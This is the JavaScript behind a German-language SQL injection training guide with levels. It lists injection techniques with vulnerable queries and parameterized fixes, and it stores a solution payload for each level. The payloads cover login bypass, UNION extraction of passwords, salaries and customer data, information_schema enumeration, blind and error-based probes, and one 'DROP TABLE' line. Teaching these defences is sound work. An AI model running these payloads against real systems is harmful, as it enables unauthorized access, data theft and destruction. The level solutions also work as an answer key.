// SQL-Insekten Extended Guide JavaScript

// SQL Injection Methods Data
const injectionMethods = [
  {
    "id": "classic",
    "name": "Classic SQL Injection",
    "description": "Die grundlegendste Form der SQL-Injection durch String-Konkatenation",
    "payload": "' OR '1'='1' --",
    "vulnerable_code": "SELECT * FROM users WHERE username = '$username' AND password = '$password'",
    "why_it_works": "Der Apostroph beendet den String, OR '1'='1' ist immer wahr, -- kommentiert den Rest aus",
    "safe_code": "SELECT * FROM users WHERE username = ? AND password = ?",
    "examples": [
      "' OR 1=1 --",
      "' OR 'a'='a' --",
      "admin' --"
    ]
  },
  {
    "id": "union",
    "name": "UNION SELECT Injection",
    "description": "Kombiniert Ergebnisse aus verschiedenen Tabellen mit dem UNION-Operator",
    "payload": "' UNION SELECT null, username, password FROM users --",
    "vulnerable_code": "SELECT product_id, product_name FROM products WHERE category = '$category'",
    "why_it_works": "UNION kombiniert Ergebnisse zweier SELECT-Statements mit gleicher Spaltenanzahl",
    "safe_code": "SELECT product_id, product_name FROM products WHERE category = ?",
    "examples": [
      "' UNION SELECT 1, username, password FROM users --",
      "' UNION SELECT table_name, column_name FROM information_schema.columns --",
      "' UNION SELECT @@version, database(), user() --"
    ]
  },
  {
    "id": "boolean_blind",
    "name": "Boolean-based Blind SQL Injection",
    "description": "Nutzt unterschiedliche Anwendungsverhalten bei True/False-Bedingungen",
    "payload": "' AND 1=1 --",
    "vulnerable_code": "SELECT * FROM products WHERE id = $id",
    "why_it_works": "Verschiedene Bedingungen führen zu unterschiedlichen Anwendungsantworten",
    "safe_code": "SELECT * FROM products WHERE id = ?",
    "examples": [
      "' AND 1=1 --",
      "' AND 1=2 --",
      "' AND (SELECT COUNT(*) FROM users) > 0 --"
    ]
  },
  {
    "id": "time_blind",
    "name": "Time-based Blind SQL Injection",
    "description": "Nutzt zeitbasierte Verzögerungen zur Informationsgewinnung",
    "payload": "' OR IF(1=1, SLEEP(5), 0) --",
    "vulnerable_code": "SELECT * FROM products WHERE id = $id",
    "why_it_works": "Verzögerungen in der Antwortzeit zeigen erfolgreiche Injection an",
    "safe_code": "SELECT * FROM products WHERE id = ?",
    "examples": [
      "' OR IF(1=1, SLEEP(5), 0) --",
      "' OR IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0) --",
      "' OR IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0) --"
    ]
  },
  {
    "id": "error_based",
    "name": "Error-based SQL Injection",
    "description": "Nutzt Fehlermeldungen zur Informationsgewinnung",
    "payload": "' AND (SELECT COUNT(*) FROM information_schema.tables) --",
    "vulnerable_code": "SELECT * FROM products WHERE id = $id",
    "why_it_works": "Detaillierte Fehlermeldungen verraten Datenbankstrukturen",
    "safe_code": "SELECT * FROM products WHERE id = ?",
    "examples": [
      "' AND (SELECT COUNT(*) FROM information_schema.tables) --",
      "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version))) --",
      "' AND 1=CAST((SELECT @@version) AS INT) --"
    ]
  },
  {
    "id": "information_schema",
    "name": "Information Schema Injection",
    "description": "Nutzt Metadaten-Tabellen zur Datenbankstruktur-Erkundung",
    "payload": "' UNION SELECT table_name, column_name FROM information_schema.columns --",
    "vulnerable_code": "SELECT * FROM products WHERE category = '$category'",
    "why_it_works": "information_schema enthält Metadaten über alle Tabellen und Spalten",
    "safe_code": "SELECT * FROM products WHERE category = ?",
    "examples": [
      "' UNION SELECT table_name, null FROM information_schema.tables --",
      "' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users' --",
      "' UNION SELECT schema_name, null FROM information_schema.schemata --"
    ]
  }
];

// Level data with detailed explanations
const levels = [
  {
    "id": 1,
    "title": "Login umgehen",
    "method": "classic",
    "payload": "' OR '1'='1' --",
    "explanation": "Klassische SQL-Injection durch String-Konkatenation",
    "steps": [
      "Apostroph (') schließt den ursprünglichen String",
      "OR '1'='1' ist immer wahr",
      "-- kommentiert den Rest der Abfrage aus"
    ]
  },
  {
    "id": 2,
    "title": "Gezielter Login",
    "method": "classic",
    "payload": "alexamusterfrau' --",
    "explanation": "Gezielte Anmeldung als bestimmter Benutzer",
    "steps": [
      "Gültiger Benutzername wird eingegeben",
      "Apostroph schließt den String",
      "-- kommentiert die Passwortprüfung aus"
    ]
  },
  {
    "id": 3,
    "title": "Tabelle löschen",
    "method": "classic",
    "payload": "'; DROP TABLE benutzer; --",
    "explanation": "Mehrere SQL-Statements durch Semikolon-Trennung",
    "steps": [
      "Apostroph schließt den String",
      "Semikolon beendet das erste Statement",
      "DROP TABLE löscht die Tabelle",
      "-- kommentiert den Rest aus"
    ]
  },
  {
    "id": 4,
    "title": "Benutzerdaten ausgeben",
    "method": "union",
    "payload": "' UNION SELECT benutzername, passwort FROM benutzer --",
    "explanation": "UNION SELECT kombiniert Ergebnisse verschiedener Tabellen",
    "steps": [
      "Apostroph schließt den String",
      "UNION SELECT fügt weitere Abfrage hinzu",
      "Spaltenanzahl muss übereinstimmen",
      "-- kommentiert den Rest aus"
    ]
  },
  {
    "id": 5,
    "title": "Metadaten auslesen",
    "method": "information_schema",
    "payload": "' UNION SELECT table_name, column_name FROM information_schema.columns --",
    "explanation": "Information Schema zur Datenbankstruktur-Erkundung",
    "steps": [
      "information_schema.columns enthält Metadaten",
      "table_name zeigt alle Tabellennamen",
      "column_name zeigt alle Spaltennamen",
      "Struktur der Datenbank wird aufgedeckt"
    ]
  },
  {
    "id": 6,
    "title": "Lohn-Daten extrahieren",
    "method": "union",
    "payload": "' UNION SELECT lohn AS benutzername FROM mitarbeiter WHERE vorname = 'Greta Maria' --",
    "explanation": "Gezielte Datenextraktion mit Aliasing",
    "steps": [
      "UNION SELECT für Datenextraktion",
      "AS benutzername für Alias",
      "WHERE-Klausel für gezielte Suche",
      "Lohn-Daten werden als Benutzername angezeigt"
    ]
  },
  {
    "id": 7,
    "title": "Mitarbeiterdaten (5 Spalten)",
    "method": "union",
    "payload": "' UNION SELECT name, email, lohn, angestellt_seit, NULL FROM mitarbeiter --",
    "explanation": "UNION SELECT mit genauer Spaltenanzahl",
    "steps": [
      "Fünf Spalten für korrektes UNION",
      "NULL für fehlende Spalten",
      "Alle Mitarbeiterdaten werden extrahiert",
      "Spaltenanzahl muss exakt übereinstimmen"
    ]
  },
  {
    "id": 8,
    "title": "Tabellen-Metadaten",
    "method": "information_schema",
    "payload": "' UNION SELECT table_name, NULL FROM information_schema.tables --",
    "explanation": "Ermittlung aller Tabellennamen über information_schema",
    "steps": [
      "information_schema.tables für Tabellennamen",
      "NULL als zweite Spalte für korrektes UNION",
      "Alle Tabellen der Datenbank werden angezeigt",
      "Basis für weitere Angriffe"
    ]
  },
  {
    "id": 9,
    "title": "Spalten der Kunden-Tabelle",
    "method": "information_schema",
    "payload": "' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='kunden' --",
    "explanation": "Spezifische Spalteninformationen einer Tabelle",
    "steps": [
      "information_schema.columns für Spaltennamen",
      "data_type zeigt Datentypen",
      "WHERE table_name='kunden' filtert Tabelle",
      "Vollständige Tabellenstruktur wird enthüllt"
    ]
  },
  {
    "id": 10,
    "title": "URL-Parameter Manipulation",
    "method": "union",
    "payload": "?produkt_id=3",
    "explanation": "URL-basierte Parameter-Manipulation",
    "steps": [
      "URL-Parameter direkt manipulieren",
      "Keine Formular-Eingabe erforderlich",
      "GET-Parameter als Angriffsziel",
      "URL-Encoding beachten"
    ]
  },
  {
    "id": 11,
    "title": "Kunde 3 via URL",
    "method": "union",
    "payload": "3 UNION SELECT name, email, adresse FROM kunden WHERE kunden_id=3 --",
    "explanation": "Gezielte Datenabfrage über URL-Parameter",
    "steps": [
      "URL-Parameter als Injection-Punkt",
      "UNION SELECT für Datenextraktion",
      "WHERE-Klausel für gezielte Suche",
      "URL-Encoding: %20 für Leerzeichen"
    ]
  }
];

// URL encoding data
const urlEncoding = {
  "space": "%20",
  "single_quote": "%27",
  "double_quote": "%22",
  "equals": "%3D",
  "ampersand": "%26",
  "hash": "%23",
  "semicolon": "%3B",
  "examples": [
    {
      "original": "' OR '1'='1' --",
      "encoded": "%27%20OR%20%271%27%3D%271%27%20--"
    },
    {
      "original": "' UNION SELECT null, username FROM users --",
      "encoded": "%27%20UNION%20SELECT%20null,%20username%20FROM%20users%20--"
    }
  ]
};

// DOM elements
const themeToggle = document.getElementById('theme-toggle');
const guideGrid = document.getElementById('guide-grid');
const levelModal = document.getElementById('level-modal');
const levelModalTitle = document.getElementById('level-modal-title');
const levelModalClose = document.getElementById('level-modal-close');
const levelMethod = document.getElementById('level-method');
const levelPayload = document.getElementById('level-payload');
const levelExplanation = document.getElementById('level-explanation');
const levelSteps = document.getElementById('level-steps');

// Theme management
let currentTheme = 'light';

function initTheme() {
  const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
  
  if (systemPrefersDark) {
    currentTheme = 'dark';
    document.documentElement.setAttribute('data-color-scheme', 'dark');
    updateThemeToggle('dark');
  } else {
    currentTheme = 'light';
    document.documentElement.setAttribute('data-color-scheme', 'light');
    updateThemeToggle('light');
  }
}

function updateThemeToggle(theme) {
  if (themeToggle) {
    themeToggle.textContent = theme === 'dark' ? '☀️' : '🌙';
    themeToggle.setAttribute('aria-label', theme === 'dark' ? 'Light Mode aktivieren' : 'Dark Mode aktivieren');
  }
}

function toggleTheme() {
  currentTheme = currentTheme === 'dark' ? 'light' : 'dark';
  
  document.documentElement.setAttribute('data-color-scheme', currentTheme);
  updateThemeToggle(currentTheme);
}

// Level card generation
function generateLevelDescription(levelData) {
  const method = injectionMethods.find(m => m.id === levelData.method);
  const methodName = method ? method.name : 'SQL Injection';
  
  return `${levelData.explanation} - Verwendet: ${methodName}`;
}

function createLevelCard(levelData) {
  const card = document.createElement('div');
  card.className = 'level-card';
  
  const method = injectionMethods.find(m => m.id === levelData.method);
  const methodName = method ? method.name : 'SQL Injection';
  
  card.innerHTML = `
    <div class="level-card__header">
      <div class="level-card__level">Level ${levelData.id}</div>
      <h3 class="level-card__title">${levelData.title}</h3>
    </div>
    <div class="level-card__description">
      <p>${generateLevelDescription(levelData)}</p>
      <div class="method-tag">${methodName}</div>
    </div>
    <div class="level-card__actions">
      <button class="btn btn--primary" data-level="${levelData.id}">
        Details ansehen
      </button>
    </div>
  `;
  
  // Add event listener to the button
  const button = card.querySelector('.btn');
  button.addEventListener('click', function() {
    openLevelModal(levelData.id);
  });
  
  return card;
}

function renderLevelCards() {
  if (!guideGrid) return;
  
  guideGrid.innerHTML = '';
  
  levels.forEach(levelData => {
    const card = createLevelCard(levelData);
    guideGrid.appendChild(card);
  });
}

// Modal functionality
function openLevelModal(levelId) {
  const levelData = levels.find(l => l.id === levelId);
  if (!levelData || !levelModal) return;
  
  const method = injectionMethods.find(m => m.id === levelData.method);
  const methodName = method ? method.name : 'SQL Injection';
  
  // Set modal content
  if (levelModalTitle) {
    levelModalTitle.textContent = `Level ${levelData.id}: ${levelData.title}`;
  }
  
  if (levelMethod) {
    levelMethod.textContent = methodName;
  }
  
  if (levelPayload) {
    levelPayload.textContent = levelData.payload;
  }
  
  if (levelExplanation) {
    levelExplanation.textContent = levelData.explanation;
  }
  
  if (levelSteps) {
    levelSteps.innerHTML = '';
    levelData.steps.forEach(step => {
      const li = document.createElement('li');
      li.textContent = step;
      levelSteps.appendChild(li);
    });
  }
  
  levelModal.classList.remove('hidden');
  
  // Focus management for accessibility
  const modalContent = levelModal.querySelector('.modal__content');
  if (modalContent) {
    modalContent.focus();
  }
}

function closeLevelModal() {
  if (levelModal) {
    levelModal.classList.add('hidden');
  }
}

// Smooth scrolling for navigation links
function initSmoothScrolling() {
  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
      e.preventDefault();
      
      const target = document.querySelector(this.getAttribute('href'));
      if (target) {
        target.scrollIntoView({
          behavior: 'smooth',
          block: 'start'
        });
      }
    });
  });
}

// Interactive method cards
function initMethodCards() {
  const methodCards = document.querySelectorAll('.method-card');
  
  methodCards.forEach(card => {
    const sections = card.querySelectorAll('.method-section');
    
    sections.forEach(section => {
      const header = section.querySelector('h4');
      if (header) {
        header.style.cursor = 'pointer';
        header.addEventListener('click', function() {
          const content = section.querySelector('p, .examples-grid, .technical-list, .comparison-grid, .info-schema-grid');
          if (content) {
            const isVisible = content.style.display !== 'none';
            content.style.display = isVisible ? 'none' : 'block';
            header.textContent = isVisible ? header.textContent.replace('▼', '▶') : header.textContent.replace('▶', '▼');
            
            if (!header.textContent.includes('▼') && !header.textContent.includes('▶')) {
              header.textContent += isVisible ? ' ▶' : ' ▼';
            }
          }
        });
      }
    });
  });
}

// Copy to clipboard functionality
function initCopyToClipboard() {
  const codeBlocks = document.querySelectorAll('.code-block');
  
  codeBlocks.forEach(block => {
    const copyButton = document.createElement('button');
    copyButton.className = 'btn btn--outline btn--sm';
    copyButton.textContent = 'Kopieren';
    copyButton.style.position = 'absolute';
    copyButton.style.top = '8px';
    copyButton.style.right = '8px';
    copyButton.style.fontSize = '12px';
    copyButton.style.opacity = '0';
    copyButton.style.transition = 'opacity 0.2s';
    
    block.style.position = 'relative';
    block.appendChild(copyButton);
    
    block.addEventListener('mouseenter', () => {
      copyButton.style.opacity = '1';
    });
    
    block.addEventListener('mouseleave', () => {
      copyButton.style.opacity = '0';
    });
    
    copyButton.addEventListener('click', function(e) {
      e.preventDefault();
      const code = block.querySelector('code');
      if (code) {
        navigator.clipboard.writeText(code.textContent).then(() => {
          copyButton.textContent = 'Kopiert!';
          setTimeout(() => {
            copyButton.textContent = 'Kopieren';
          }, 2000);
        }).catch(() => {
          // Fallback for older browsers
          const textArea = document.createElement('textarea');
          textArea.value = code.textContent;
          document.body.appendChild(textArea);
          textArea.select();
          document.execCommand('copy');
          document.body.removeChild(textArea);
          copyButton.textContent = 'Kopiert!';
          setTimeout(() => {
            copyButton.textContent = 'Kopieren';
          }, 2000);
        });
      }
    });
  });
}

// FAQ toggle functionality
function initFAQToggle() {
  const details = document.querySelectorAll('details');
  
  details.forEach(detail => {
    detail.addEventListener('toggle', function() {
      if (this.open) {
        // Close other details
        details.forEach(other => {
          if (other !== this && other.open) {
            other.open = false;
          }
        });
      }
    });
  });
}

// Search functionality for methods
function initMethodSearch() {
  const searchInput = document.createElement('input');
  searchInput.type = 'text';
  searchInput.placeholder = 'Methoden durchsuchen...';
  searchInput.className = 'form-control';
  searchInput.style.marginBottom = '32px';
  
  const methodsSection = document.getElementById('methods');
  if (methodsSection) {
    const container = methodsSection.querySelector('.container');
    if (container) {
      const title = container.querySelector('h2');
      if (title) {
        title.insertAdjacentElement('afterend', searchInput);
      }
    }
  }
  
  searchInput.addEventListener('input', function() {
    const searchTerm = this.value.toLowerCase();
    const methodCards = document.querySelectorAll('.method-card');
    
    methodCards.forEach(card => {
      const title = card.querySelector('.method-card__title');
      const description = card.querySelector('.method-card__description');
      
      if (title && description) {
        const titleText = title.textContent.toLowerCase();
        const descText = description.textContent.toLowerCase();
        
        if (titleText.includes(searchTerm) || descText.includes(searchTerm)) {
          card.style.display = 'block';
        } else {
          card.style.display = 'none';
        }
      }
    });
  });
}

// Keyboard navigation
function initKeyboardNavigation() {
  document.addEventListener('keydown', function(e) {
    // Escape key closes modal
    if (e.key === 'Escape' && levelModal && !levelModal.classList.contains('hidden')) {
      closeLevelModal();
    }
    
    // Ctrl/Cmd + K for search
    if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
      e.preventDefault();
      const searchInput = document.querySelector('input[placeholder*="durchsuchen"]');
      if (searchInput) {
        searchInput.focus();
      }
    }
  });
}

// Event listeners
function initEventListeners() {
  // Theme toggle
  if (themeToggle) {
    themeToggle.addEventListener('click', function(e) {
      e.preventDefault();
      toggleTheme();
    });
  }
  
  // Level modal close
  if (levelModalClose) {
    levelModalClose.addEventListener('click', function(e) {
      e.preventDefault();
      closeLevelModal();
    });
  }
  
  // Modal overlay close
  if (levelModal) {
    levelModal.addEventListener('click', function(e) {
      if (e.target === levelModal) {
        closeLevelModal();
      }
    });
  }
}

// Initialize everything when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
  initTheme();
  renderLevelCards();
  initSmoothScrolling();
  initEventListeners();
  initMethodCards();
  initCopyToClipboard();
  initFAQToggle();
  initMethodSearch();
  initKeyboardNavigation();
});

// Handle system theme changes
window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', function(e) {
  const newTheme = e.matches ? 'dark' : 'light';
  currentTheme = newTheme;
  document.documentElement.setAttribute('data-color-scheme', newTheme);
  updateThemeToggle(newTheme);
});

// Export data for potential external use
window.SQLInjectionGuide = {
  methods: injectionMethods,
  levels: levels,
  urlEncoding: urlEncoding
};